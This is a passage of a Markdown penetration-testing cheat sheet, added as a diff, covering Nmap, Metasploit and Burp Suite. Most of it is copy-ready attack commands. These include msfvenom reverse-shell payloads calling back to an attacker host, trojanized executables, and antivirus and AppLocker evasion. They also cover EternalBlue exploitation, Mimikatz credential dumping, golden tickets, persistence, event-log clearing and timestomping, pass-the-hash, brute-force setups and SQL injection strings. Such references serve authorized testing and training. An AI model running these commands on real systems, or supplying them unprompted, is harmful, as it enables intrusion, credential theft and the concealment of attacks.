+# -Pn required as ICMP doesn't work through SOCKS
+```
+
+### Parsing Nmap Results
+
+**XML to HTML Conversion:**
+
+```bash
+# Using xsltproc
+xsltproc scan_results.xml -o scan_results.html
+
+# Using Nmap's XSL
+xsltproc /usr/share/nmap/nmap.xsl scan_results.xml -o scan_results.html
+```
+
+**Extracting Data from Grepable Format:**
+
+```bash
+# Extract open ports per host
+awk '/open/{print $2, $4}' scan_results.gnmap
+
+# Find hosts with specific port open
+grep "22/open" scan_results.gnmap | cut -d " " -f 2
+
+# Count hosts with web servers
+grep -c "80/open\|443/open" scan_results.gnmap
+```
+
+**Using ndiff for Scan Comparison:**
+
+```bash
+# Compare two scans
+ndiff scan1.xml scan2.xml
+
+# HTML comparison report
+ndiff --html scan1.xml scan2.xml > comparison.html
+```
+
+### Nmap Performance Optimization
+
+```bash
+# Fast scan optimized for CTF/pentesting
+nmap -sS -T4 -p- --min-rate 1000 --max-retries 2 target_ip
+
+# Balance between speed and accuracy
+nmap -sS -T4 -p- --min-rate 500 --max-retries 3 -sV --version-intensity 5 target_ip
+
+# Ultra-fast scan (may miss results)
+nmap -sS -T5 -p- --min-rate 5000 --max-retries 1 target_ip
+```
+
+### Nmap Integration with Other Tools
+
+**Feed Results to Metasploit:**
+
+```bash
+# Import Nmap XML into Metasploit
+msfconsole
+msf6 > db_import scan_results.xml
+msf6 > hosts
+msf6 > services
+```
+
+**Masscan Integration (for speed):**
+
+```bash
+# Ultra-fast initial scan with masscan
+masscan -p1-65535 192.168.1.0/24 --rate=10000 -oL masscan_results.txt
+
+# Parse masscan results for Nmap verification
+grep "open" masscan_results.txt | awk '{print $4":"$3}' > targets_ports.txt
+
+# Verify with Nmap
+nmap -sV -iL targets_ports.txt -oA verified_scan
+```
+
+## Metasploit Framework
+
+Metasploit is the industry-standard exploitation framework providing exploit modules, payloads, encoders, and post-exploitation capabilities.
+
+### Framework Architecture
+
+**Core Components:**
+
+- **Modules:** Exploits, auxiliary, post, payloads, encoders, nops, evasion
+- **Database:** PostgreSQL backend for session/data management
+- **RPC:** Remote API for automation
+- **Console:** msfconsole (primary interface)
+
+### Database Setup and Management
+
+```bash
+# Start PostgreSQL
+sudo systemctl start postgresql
+
+# Initialize MSF database
+sudo msfdb init
+
+# Check database status
+sudo msfdb status
+
+# Reinitialize (if issues)
+sudo msfdb delete
+sudo msfdb init
+```
+
+**Database Operations in Console:**
+
+```bash
+msfconsole
+
+# Check database connection
+msf6 > db_status
+
+# Workspace management
+msf6 > workspace -a project_name
+msf6 > workspace project_name
+msf6 > workspace -l
+msf6 > workspace -d old_project
+
+# Import scan results
+msf6 > db_import /path/to/nmap_scan.xml
+
+# View imported data
+msf6 > hosts
+msf6 > services
+msf6 > vulns
+
+# Search database
+msf6 > hosts -S 192.168.1
+msf6 > services -p 445
+msf6 > services -s http
+```
+
+### Module Types and Usage
+
+**Exploit Modules:**
+
+```bash
+# Search exploits
+msf6 > search type:exploit platform:windows smb
+
+# Use exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# Show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing
+
+# Set options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.5
+
+# Show targets
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets
+
+# Show payloads
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+
+# Run exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+```
+
+**Auxiliary Modules:**
+
+```bash
+# Scanners
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 > use auxiliary/scanner/ssh/ssh_login
+
+# Fuzzing
+msf6 > use auxiliary/fuzzers/http/http_form_field
+
+# Admin modules
+msf6 > use auxiliary/admin/smb/psexec_command
+
+# DoS modules
+msf6 > use auxiliary/dos/tcp/synflood
+
+# Example: SMB scanning
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/smb/smb_version) > set THREADS 10
+msf6 auxiliary(scanner/smb/smb_version) > run
+```
+
+**Post-Exploitation Modules:**
+
+```bash
+# Requires active session
+msf6 > sessions -l
+
+# Use post module
+msf6 > use post/windows/gather/hashdump
+msf6 post(windows/gather/hashdump) > set SESSION 1
+msf6 post(windows/gather/hashdump) > run
+
+# Common post modules
+msf6 > use post/windows/gather/credentials/credential_collector
+msf6 > use post/windows/gather/enum_shares
+msf6 > use post/windows/gather/enum_applications
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 > use post/windows/manage/enable_rdp
+```
+
+### Payload Generation and Selection
+
+**Payload Types:**
+
+- **Singles:** Self-contained, no stage required
+- **Stagers:** Small payload that fetches larger stage
+- **Stages:** Full-featured payload delivered by stager
+
+```bash
+# List payloads for current exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+
+# Set specific payload
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Common payloads
+# Windows
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+windows/shell/reverse_tcp
+windows/x64/shell_reverse_tcp
+
+# Linux
+linux/x86/meterpreter/reverse_tcp
+linux/x64/meterpreter/reverse_tcp
+linux/x86/shell/reverse_tcp
+
+# Multi-platform
+generic/shell_reverse_tcp
+cmd/unix/reverse
+```
+
+**Msfvenom Payload Generation:**
+
+```bash
+# List formats
+msfvenom --list formats
+
+# List payloads
+msfvenom --list payloads
+
+# Windows reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe
+
+# Linux reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf
+
+# Web payloads
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.jsp
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f asp -o shell.asp
+
+# Scripting payloads
+msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.5 LPORT=4444 -f raw
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py
+
+# Encoded payloads
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
+
+# Bad characters removal (for buffer overflow)
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0a\x0d' -f python
+
+# Multiple iterations
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
+
+# Template injection
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/template.exe -k -f exe -o trojan.exe
+```
+
+**Setting Up Multi/Handler:**
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.5
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit -j  # Run as job
+
+# List active handlers
+msf6 > jobs -l
+
+# Kill job
+msf6 > jobs -k [job_id]
+```
+
+### Meterpreter Essentials
+
+**Basic Commands:**
+
+```bash
+# System information
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid
+
+# Process management
+meterpreter > ps
+meterpreter > migrate [pid]
+meterpreter > kill [pid]
+
+# File system
+meterpreter > pwd
+meterpreter > ls
+meterpreter > cd C:\\Windows\\Temp
+meterpreter > cat file.txt
+meterpreter > download C:\\file.txt /root/file.txt
+meterpreter > upload /root/tool.exe C:\\Windows\\Temp\\tool.exe
+
+# Search files
+meterpreter > search -f *.txt
+meterpreter > search -d C:\\ -f passwords.txt
+
+# Execute commands
+meterpreter > execute -f cmd.exe -i -H
+meterpreter > shell
+```
+
+**Privilege Escalation:**
+
+```bash
+# Get SYSTEM privileges
+meterpreter > getsystem
+
+# Bypass UAC
+meterpreter > background
+msf6 > use exploit/windows/local/bypassuac_injection
+msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
+msf6 exploit(windows/local/bypassuac_injection) > run
+
+# Local exploit suggester
+meterpreter > run post/multi/recon/local_exploit_suggester
+```
+
+**Credential Harvesting:**
+
+```bash
+# Dump hashes (requires SYSTEM)
+meterpreter > hashdump
+
+# Kiwi (Mimikatz)
+meterpreter > load kiwi
+meterpreter > kiwi_cmd privilege::debug
+meterpreter > kiwi_cmd sekurlsa::logonpasswords
+meterpreter > creds_all
+meterpreter > creds_kerberos
+meterpreter > creds_msv
+meterpreter > creds_wdigest
+
+# Golden ticket
+meterpreter > golden_ticket_create -d domain.local -k krbtgt_hash -s domain_sid -u administrator -t /tmp/golden.ticket
+```
+
+**Network Pivoting:**
+
+```bash
+# Add route through session
+meterpreter > run autoroute -s 10.10.10.0/24
+
+# View routes
+meterpreter > run autoroute -p
+
+# Port forwarding
+meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 8080
+
+# SOCKS proxy
+meterpreter > background
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
+msf6 auxiliary(server/socks_proxy) > set VERSION 4a
+msf6 auxiliary(server/socks_proxy) > run -j
+```
+
+**Persistence:**
+
+```bash
+# Registry persistence
+meterpreter > run persistence -X -i 60 -p 4445 -r 192.168.1.5
+
+# Service persistence
+meterpreter > background
+msf6 > use exploit/windows/local/persistence_service
+msf6 exploit(windows/local/persistence_service) > set SESSION 1
+msf6 exploit(windows/local/persistence_service) > run
+```
+
+**Covering Tracks:**
+
+```bash
+# Clear event logs
+meterpreter > clearev
+
+# Timestomp
+meterpreter > timestomp C:\\Windows\\Temp\\malware.exe -v
+meterpreter > timestomp C:\\Windows\\Temp\\malware.exe -m "01/01/2020 12:00:00"
+```
+
+### Advanced Exploitation Techniques
+
+**Pivoting Through Sessions:**
+
+```bash
+# Add route
+msf6 > route add 10.10.10.0/24 [session_id]
+msf6 > route print
+
+# Use internal network from external session
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+# Exploit through pivot
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.5
+msf6 exploit(windows/smb/psexec) > set SMBUser administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass password
+msf6 exploit(windows/smb/psexec) > exploit
+```
+
+**Credential Re-use (Pass-the-Hash):**
+
+```bash
+# Using psexec
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.10
+msf6 exploit(windows/smb/psexec) > set SMBUser administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+msf6 exploit(windows/smb/psexec) > exploit
+
+# Spray credentials across multiple hosts
+msf6 > use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS file:/root/targets.txt
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
+msf6 auxiliary(scanner/smb/smb_login) > set SMBPass password
+msf6 auxiliary(scanner/smb/smb_login) > set THREADS 10
+msf6 auxiliary(scanner/smb/smb_login) > run
+```
+
+**Session Management:**
+
+```bash
+# List sessions
+msf6 > sessions -l
+
+# Interact with session
+msf6 > sessions -i [id]
+
+# Background session
+meterpreter > background
+[Ctrl+Z]
+
+# Kill session
+msf6 > sessions -k [id]
+
+# Upgrade shell to meterpreter
+msf6 > sessions -u [id]
+
+# Run command on all sessions
+msf6 > sessions -c "sysinfo" -i 1,2,3
+
+# Script all sessions
+msf6 > sessions -s /path/to/script.rc
+```
+
+### Resource Scripts (.rc files)
+
+**Creating Resource Scripts:**
+
+```bash
+# Example: auto_exploit.rc
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit -j -z
+
+# Run resource script
+msfconsole -r auto_exploit.rc
+
+# Or from console
+msf6 > resource /path/to/script.rc
+
+# Record commands to script
+msf6 > makerc /root/recorded_commands.rc
+```
+
+**Auto-exploitation Script:**
+
+```bash
+# auto_pwn.rc
+workspace -a auto_pwn
+db_import /root/nmap_scan.xml hosts -R 
+use auxiliary/scanner/smb/smb_version 
+set THREADS 20 
+run 
+use exploit/windows/smb/ms17_010_eternalblue 
+services -p 445 -R 
+set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.5 
+set LPORT 4444 
+exploit -z
+
+````
+
+**Post-Exploitation Automation:**
+```bash
+# post_exploit.rc
+use post/windows/gather/hashdump
+sessions -i 1
+run
+background
+use post/windows/gather/enum_shares
+set SESSION 1
+run
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+````
+
+### Metasploit Modules Development
+
+**Basic Module Structure:**
+
+```ruby
+# exploits/example/my_exploit.rb
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Example Exploit',
+      'Description'    => %q{
+        This exploits a vulnerability in example service
+      },
+      'Author'         => ['Your Name'],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2024-1234'],
+          ['URL', 'http://example.com/advisory']
+        ],
+      'Platform'       => 'linux',
+      'Targets'        =>
+        [
+          ['Linux x64', { 'Arch' => ARCH_X64 }]
+        ],
+      'Payload'        =>
+        {
+          'Space'    => 1000,
+          'BadChars' => "\x00\x0a\x0d"
+        },
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(9999)
+      ])
+  end
+
+  def exploit
+    connect
+    
+    payload_data = payload.encoded
+    
+    # Exploitation logic here
+    sploit = "A" * 1024 + payload_data
+    
+    sock.put(sploit)
+    
+    handler
+    disconnect
+  end
+end
+```
+
+**Module Location and Reload:**
+
+```bash
+# Custom modules directory
+~/.msf4/modules/
+
+# Reload all modules
+msf6 > reload_all
+
+# Reload specific module
+msf6 > reload_lib /path/to/module.rb
+```
+
+### MSFVenom Advanced Usage
+
+**Platform-Specific Payloads:**
+
+```bash
+# Android APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o malicious.apk
+
+# macOS
+msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o shell.macho
+
+# Python bytecode
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw | base64
+
+# PowerShell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh -o shell.ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-cmd
+
+# Shellcode formats
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f python
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw
+```
+
+**Embedding Payloads:**
+
+```bash
+# Inject into legitimate executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/legit.exe -k -f exe -o trojan.exe
+
+# Template with specific architecture
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/legit64.exe -k -a x64 --platform windows -f exe -o trojan64.exe
+```
+
+**Staged vs Stageless:**
+
+```bash
+# Staged (smaller initial payload, requires metasploit handler)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o staged.exe
+
+# Stageless (fully self-contained, larger)
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
+```
+
+**Encoders and Iterations:**
+
+```bash
+# List encoders
+msfvenom --list encoders
+
+# Shikata ga nai (polymorphic XOR)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
+
+# Multiple encoders
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe
+
+# Architecture-specific encoders
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f elf -o encoded.elf
+```
+
+### Metasploit Evasion Modules
+
+```bash
+# List evasion modules
+msf6 > search type:evasion
+
+# Use evasion module
+msf6 > use evasion/windows/windows_defender_exe
+msf6 evasion(windows/windows_defender_exe) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.1.5
+msf6 evasion(windows/windows_defender_exe) > set LPORT 4444
+msf6 evasion(windows/windows_defender_exe) > run
+
+# Applocker evasion
+msf6 > use evasion/windows/applocker_evasion_install_util
+msf6 > use evasion/windows/applocker_evasion_msbuild
+msf6 > use evasion/windows/applocker_evasion_regasm_regsvcs
+```
+
+### Exploit Ranking System
+
+Metasploit ranks exploits by reliability:
+
+- **ExcellentRanking:** Exploit never crashes service
+- **GreatRanking:** Exploit rarely crashes service
+- **GoodRanking:** Exploit sometimes crashes service
+- **NormalRanking:** Exploit often crashes service
+- **AverageRanking:** Exploit unreliable
+- **LowRanking:** Exploit nearly unusable
+- **ManualRanking:** Exploit unstable/requires manual setup
+
+```bash
+# Search by rank
+msf6 > search rank:excellent type:exploit
+```
+
+### Automation and Scripting
+
+**Using MSFConsole with Commands:**
+
+```bash
+# One-liner execution
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit"
+
+# Execute multiple commands
+msfconsole -q -x "workspace -a project; db_import scan.xml; hosts; exit"
+```
+
+**MSF RPC (Remote Procedure Call):**
+
+```bash
+# Start RPC server
+msfrpcd -P password -U username -a 127.0.0.1
+
+# Connect from another terminal
+msf6 > load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=username Pass=password
+```
+
+**Python automation with pymetasploit3:**
+
+```python
+from pymetasploit3.msfrpc import MsfRpcClient
+
+client = MsfRpcClient('password', server='127.0.0.1', port=55553)
+
+exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+exploit['RHOSTS'] = '192.168.1.10'
+exploit['LHOST'] = '192.168.1.5'
+exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
+
+print(exploit.execute())
+```
+
+## Burp Suite Professional
+
+Burp Suite is the industry-standard web application security testing platform. Professional edition provides advanced scanning, extension support, and collaboration features.
+
+### Core Components
+
+**Proxy:** HTTP/HTTPS intercepting proxy **Target:** Site map and scope definition **Intruder:** Automated customized attacks **Repeater:** Manual request manipulation **Scanner:** Automated vulnerability detection (Pro only) **Sequencer:** Session token randomness analysis **Decoder:** Encoding/decoding utilities **Comparer:** Visual diff tool **Extender:** Extension/plugin management
+
+### Proxy Configuration
+
+**Starting Burp Proxy:**
+
+```bash
+# Launch Burp Suite
+burpsuite
+
+# Or with specific java options
+java -jar -Xmx4G /usr/share/burpsuite/burpsuite.jar
+```
+
+**Proxy Settings (Burp):**
+
+- Default listener: `127.0.0.1:8080`
+- Add listener: Proxy → Options → Proxy Listeners → Add
+- Invisible proxy mode: Proxy → Options → Request handling → Support invisible proxying
+
+**Browser Configuration:**
+
+```bash
+# Firefox proxy settings
+Preferences → Network Settings → Manual proxy configuration
+HTTP Proxy: 127.0.0.1, Port: 8080
+Use this proxy for all protocols: checked
+
+# Or use FoxyProxy extension for quick switching
+```
+
+**SSL/TLS Certificate Installation:**
+
+1. Browse to `http://burpsuite` with proxy enabled
+2. Download CA certificate (DER format)
+3. Firefox: Preferences → Privacy & Security → Certificates → View Certificates → Import
+4. Chrome: Settings → Privacy and security → Security → Manage certificates → Import
+
+**Upstream Proxy Configuration:**
+
+```bash
+# Route Burp through another proxy (e.g., Tor)
+Burp → User options → Connections → Upstream Proxy Servers → Add
+Destination host: *
+Proxy host: 127.0.0.1
+Proxy port: 9050 (Tor SOCKS)
+Type: SOCKS
+```
+
+### Target Scope and Site Mapping
+
+**Defining Scope:**
+
+```bash
+Target → Scope → Add
+Protocol: HTTP/HTTPS
+Host: target.com
+File: ^/.*$ (regex for all paths)
+
+# Include only in-scope items
+Target → Site map → Filter → Show only in-scope items
+Proxy → Options → Intercept Client Requests → And URL is in target scope
+```
+
+**Spider/Crawler:**
+
+```bash
+# Manual spidering
+Target → Site map → Right-click domain → Spider this host
+
+# Spider options
+Target → Site map → Right-click → Spider options
+- Maximum link depth
+- Form submission behavior
+- Login functionality handling
+
+# Forced browsing
+Target → Site map → Right-click → Discover content
+- Use wordlists from /usr/share/wordlists/
+```
+
+**Content Discovery:**
+
+```bash
+Target → Site map → Right-click target → Engagement tools → Discover content
+- Filename wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt
+- File extension list: php,asp,aspx,jsp,html,txt,bak
+```
+
+### Intruder - Automated Attacks
+
+**Attack Types:**
+
+**Sniper:** Single payload set, iterates through positions one at a time
+
+```
+Example positions: username=§admin§&password=§pass§
+Tests: admin/pass1, admin/pass2, user1/pass, user2/pass
+```
+
+**Battering Ram:** Single payload set, same value in all positions simultaneously
+
+```
+Example: username=§admin§&password=§admin§
+Tests: admin/admin, test/test, user/user
+```
+
+**Pitchfork:** Multiple payload sets, parallel iteration
+
+```
+Example: username=§admin§&password=§pass123§
+Payload set 1: admin, user, test
+Payload set 2: pass1, pass2, pass3
+Tests: admin/pass1, user/pass2, test/pass3
+```
+
+**Cluster Bomb:** Multiple payload sets, all combinations
+
+```
+Example: username=§admin§&password=§pass§
+Payload set 1: admin, user
+Payload set 2: pass1, pass2
+Tests: admin/pass1, admin/pass2, user/pass1, user/pass2
+```
+
+**Setting Up Attacks:**
+
+```bash
+# 1. Send request to Intruder
+Proxy/Repeater → Right-click request → Send to Intruder
+
+# 2. Configure positions
+Intruder → Positions
+- Clear all positions (Clear §)
+- Select text to fuzz → Add § (Add §)
+
+# 3. Configure payloads
+Intruder → Payloads
+- Payload set: Select position number
+- Payload type: Simple list, Runtime file, Numbers, etc.
+- Payload options: Add items manually or load from file
+
+# 4. Configure options
+Intruder → Options
+- Request Engine: Thread count (Pro: 30+, Community: 1)
+- Grep - Match: Extract specific strings from responses
+- Grep - Extract: Capture data with regex
+- Redirections: Follow redirects settings
+
+# 5. Start attack
+Intruder → Target → Start attack
+```
+
+**Practical Intruder Examples:**
+
+**Username Enumeration:**
+
+```bash
+# Position: username parameter
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=§admin§&password=test
+
+# Payload: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+# Filter results by response length/status code differences
+```
+
+**Password Brute Force:**
+
+```bash
+# Pitchfork attack
+POST /login HTTP/1.1
+Host: target.com
+
+username=§admin§&password=§pass§
+
+# Payload set 1: Known usernames
+# Payload set 2: /usr/share/wordlists/rockyou.txt
+# Grep - Match: "Login successful" or "Welcome"
+```
+
+**SQL Injection Detection:**
+
+```bash
+# Position: vulnerable parameter
+GET /product?id=§1§ HTTP/1.1
+
+# Payload type: Runtime file
+# Payload: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+# Grep - Match: "SQL", "error", "mysql", "syntax"
+```
+
+**IDOR Testing:**
+
+```bash
+# Position: ID parameter
+GET /api/user/§123§/profile HTTP/1.1
+
+# Payload type: Numbers
+# From: 1, To: 1000, Step: 1
+# Filter by 200 responses, check for unauthorized data access
+```
+
+### Repeater - Manual Testing
+
+```bash
+# Send request to Repeater
+Proxy/Intruder → Right-click → Send to Repeater
+
+# Modify and resend requests
+Repeater → Edit request → Send
+- View raw/hex/rendered response
+- Compare responses (Right-click → Compare)
+
+# Useful for:
+- Manual parameter manipulation
+- Authentication bypass testing
+- Header manipulation
+- Request method changes (GET→POST, etc.)
+```
+
+**Repeater Workflows:**
+
+**Testing Authentication Bypass:**
+
+```http
+# Original request
+POST /admin HTTP/1.1
+Cookie: session=abc123
+
+# Test 1: Remove cookie
+POST /admin HTTP/1.1
+
+# Test 2: Modify cookie
+POST /admin HTTP/1.1
+Cookie: session=abc123; admin=true
+
+# Test 3: Add custom headers
+POST /admin HTTP/1.1
+Cookie: session=abc123
+X-Original-URL: /admin
+X-Forwarded-For: 127.0.0.1
+```
+
+**SQL Injection Verification:**
+
+```http
+GET /search?q=test§' OR '1'='1§ HTTP/1.1
+
+# Test various payloads systematically:
+# Basic: ' OR '1'='1
+# Union: ' UNION SELECT NULL--
+# Blind: ' AND SLEEP(5)--
+# Error-based: ' AND 1=CONVERT(int,(SELECT @@version))--
+```
+
+### Scanner (Professional Only)
+
+**Active Scanning:**
+
+```bash
+# Right-click target/request
+Target/Proxy → Right-click → Scan
+
+# Scan configuration
+- Crawl and audit
+- Audit only (requires existing site map)
+- Crawl only
+
+# Scan options
+Scanner → Options → Active Scanning
+- Scan speed: Fast/Normal/Thorough
+- Scan accuracy: Normal/Minimizes false positives/Minimizes false negatives
+```
+
+**Scan Configurations:**
+
+```bash
+# Pre-configured scans
+Scanner → New scan → Scan configuration
+- Crawl strategy
+- Audit checks (SQLi, XSS, XXE, etc.)
+- Insertion points
+- False positive reduction
+
+# Custom scan configuration
+Scanner → Scan configurations → New
+- Select specific vulnerability classes
+- Configure thoroughness per check
+```
+
+**Vulnerability Analysis:**
+
+```bash
+# View scan results
+Target → Site map → Issues
+Dashboard → Issue activity
+
+# Issue details
+- Severity: High/Medium/Low/Information
+- Confidence: Certain/Firm/Tentative
+- Description and remediation
+- Request/Response evidence
+
+# Export findings
+Target → Right-click → Report selected issues
+- HTML, XML, or custom formats
+```
+
+**Scan Insertion Points:**
+
+```bash
+Scanner → Options → Active Scanning → Insertion point types
+- URL parameter values
+- Body parameter values
+- Cookie values
+- Parameter name
+- HTTP headers
+- URL path filename
+- URL path folders
+- Entire body (XML/JSON)
+```
+
+### Sequencer - Session Token Analysis
+
+**Analyzing Token Randomness:**
+
+```bash
+# Capture tokens
+Proxy → Right-click request generating tokens → Send to Sequencer
+
+# Configure token location
+Sequencer → Select location → Cookie: session=
+OR
+Sequencer → Define custom location
+
+# Start live capture
+Sequencer → Start live capture
+- Capture at least 100 tokens (20,000+ recommended for accuracy)
+- Monitor token generation rate
+
+# Analyze results
+Sequencer → Analyze now
+- Overall quality: Excellent/Good/Poor
+- Effective entropy estimate
+- Character-level analysis
+- Bit-level analysis
+```
+
+**Token Generation Testing:**
+
+```http
+# Example: Session cookie analysis
+GET /login HTTP/1.1
+Host: target.com
+
+Response:
+Set-Cookie: PHPSESSID=a3f8h2k9d1m5; path=/
+
+# Capture multiple samples
+PHPSESSID=a3f8h2k9d1m5
+PHPSESSID=b4g9i3l0e2n6
+PHPSESSID=c5h0j4m1f3o7
+...
+
+# Sequencer detects patterns/predictability
+```
+
+### Decoder
+
+**Encoding/Decoding Operations:**
+
+```bash
+Decoder → Paste data → Encode/Decode as:
+- URL encoding
+- HTML encoding
+- Base64
+- ASCII hex
+- Octal
+- Binary
+- Gzip
+- Hash: MD5, SHA-1, SHA-256
+```
+
+**Smart Decode:**
+
+```bash
+# Automatic detection and decoding
+Decoder → Smart decode
+- Automatically tries various encodings
+- Useful for nested encoding
+```
+
+**Example Workflow:**
+
+```bash
+# Encoded JWT token
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+
+# Decode each section (Base64)
+1. Decoder → Paste header → Decode as Base64
+2. Result: {"alg":"HS256","typ":"JWT"}
+3. Repeat for payload section
+```
+
+### Comparer
+
+**Visual Diff Tool:**
+
+```bash
+# Compare two requests/responses
+Right-click item → Send to Comparer (request/response)
+
+# Compare
+Comparer → Select two items → Words/Bytes comparison
+- Highlights differences
+- Useful for:
+  - Blind SQL injection timing differences
+  - Session token analysis
+  - Authentication bypass verification
+  - Before/after comparison
+```
+
+### Extensions (Extender)
+
+**Installing Extensions:**
+
+```bash
+Extender → BApp Store → Select extension → Install
+
+# Manual installation
+Extender → Extensions → Add
+- Extension type: Java/Python/Ruby
+- Extension file: .jar, .py, .rb
+```
+
+**Essential Extensions:**
+
+**Autorize:** Authorization testing
+
+```bash
+# Tests authorization for each request with different user sessions
+- Configure low-privilege user session
+- Browse as high-privilege user
+- Autorize replays requests with low-priv session
+- Flags authorization issues
+```
+
+**Logger++:** Advanced logging
+
